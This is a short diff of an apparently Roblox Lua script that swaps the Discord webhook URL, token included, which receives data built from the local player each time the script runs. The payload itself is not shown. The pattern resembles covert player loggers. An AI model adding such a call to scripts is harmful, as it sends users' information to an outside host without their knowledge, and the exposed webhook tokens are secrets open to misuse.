@@ -192,5 +192,5 @@ end
 
 local player = Players.LocalPlayer
 if player then
-    SendWebhook("https://discord.com/api/webhooks/1483869095613960264/JgNVdh5VIfAKfZmWp2Xrc0pyBCRHrdnbIFKSl0rm4AoV5Oktdkp_8lGoF-9bvk_VTTES", CreateWebhook(player))
+    SendWebhook("https://discord.com/api/webhooks/1483870393553911808/xeXblgw105MpYBT8g1vedjXq7egThZqJrDE6U9HqaTFv5DWhS0EA4lwTwgMGQjQH21m9", CreateWebhook(player))
 end
